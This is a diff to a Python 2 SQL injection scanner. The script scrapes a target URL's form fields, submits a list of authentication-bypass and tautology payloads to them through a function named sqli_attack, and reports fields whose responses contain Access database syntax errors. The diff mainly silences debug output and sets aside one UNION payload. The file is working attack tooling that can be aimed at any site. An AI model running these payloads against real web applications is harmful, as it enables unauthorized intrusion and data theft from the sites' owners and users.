@@ -32,7 +32,7 @@ def scan_header(url):
     opener = urllib.urlopen(url)
     #print "url ..."
     if opener.code == 200:
-        print "url status: 200 ok"
+        #print "url status: 200 ok"
         #print "header infor....\n",opener.headers 
         #print opener.headers
         return True    
@@ -58,12 +58,12 @@ def form_mechanize(url):
     formSubmit = []
    
     for form in br.forms():
-        print form
+        #print form
         
         formname.append(form.name)  
     
-    print "-------------[*] formname list up-----------"     
-    print formname
+    #print "-------------[*] formname list up-----------"     
+    #print formname
     
     for names in formname :
         
@@ -83,8 +83,8 @@ def form_mechanize(url):
             else:
                 formSubmit.append(control.name)
                      
-    print "-------------[*] form input id list up-----------"
-    print userTagId   
+    #print "-------------[*] form input id list up-----------"
+    #print userTagId   
     #print "*****forminfo all output saving....*****"
     #java_url.saveFormInfo()   
     return formname,userTagId 
@@ -92,10 +92,16 @@ def form_mechanize(url):
 def req_url(url, tagIdList):
     sqli_pattern = {'pattern1':"'or'1'='1", 'pattern2':"'or'1'='2", 'pattern3':"' or 1=1-- ",
                   'pattern4':"' or 1=1#", 'pattern5':"admin' #",
-                  'pattern6':"'union select 1  limit 1, 1%23",
                   'pattern7':"'", 'pattern8':"a' or 1=1 --", 'pattern9':"')or(x'='x",
                   'pattern10':"admin'--"}
     
+    '''
+    sqli_pattern = {'pattern1':"'or'1'='1", 'pattern2':"'or'1'='2", 'pattern3':"' or 1=1-- ",
+                  'pattern4':"' or 1=1#", 'pattern5':"admin' #",
+                  'pattern6':"'union select 1  limit 1, 1%23",
+                  'pattern7':"'", 'pattern8':"a' or 1=1 --", 'pattern9':"')or(x'='x",
+                  'pattern10':"admin'--"}
+    '''
 
     plist = []
     payload = {}
@@ -136,7 +142,7 @@ def sqli_attack(url, result):
     
     for re in result:
         
-        print "sqli_attack method area",re
+        #print "sqli_attack method area",re
         data = urllib.urlencode(re)
            
         try:
@@ -144,8 +150,8 @@ def sqli_attack(url, result):
             res = opener.open(request)
            # print "****************************"
            
-            print re, "-----------------------"
-            print res.read()
+            #print re, "-----------------------"
+            #print res.read()
             #print "----------------------"
             res.close()
         except urllib2.HTTPError, error:
@@ -154,12 +160,12 @@ def sqli_attack(url, result):
                 # print "*****----------------*************"
                 dberror = error.read()
                 if "Syntax error (missing operator) in query expression" in dberror:
-                    print "vulinfo",",",vulname,",",patternname,",",re,",",str(patterncomment)
+                    print "vulinfo",",",vulname.strip(),",","Syntax error (missing operator)",",",re,",",str(patterncomment)
                     test = vulname,patternname,re,str(patterncomment)
                     sqlErrorlist.append(test)
                 elif "Syntax error in string in query expression" in dberror:
-                     print "vulinfo",",",vulname,",",patternname,",",re,",",str(patterncomment)
-                     test = vulname,patternname,re,str(patterncomment)
+                     print "vulinfo",",",vulname.strip(),",","Syntax error in string",",",re,",",str(patterncomment).strip()
+                     test = vulname,patternname,re,str(patterncomment).strip()
                      sqlErrorlist.append(test)
                 
     #print sqlErrorlist,len(sqlErrorlist)
@@ -188,7 +194,7 @@ if __name__ == "__main__":
         for formname in formNameList:
             te = formname
         #print str(te)
-        print "formname,",te
+        print "formname,",te.strip()
         print "tagid",",",','.join(tagIdList)    
             
         #print "[2] formnamelist: ",str(formNameList),"tagidlist: ",str(tagIdList),"확인"
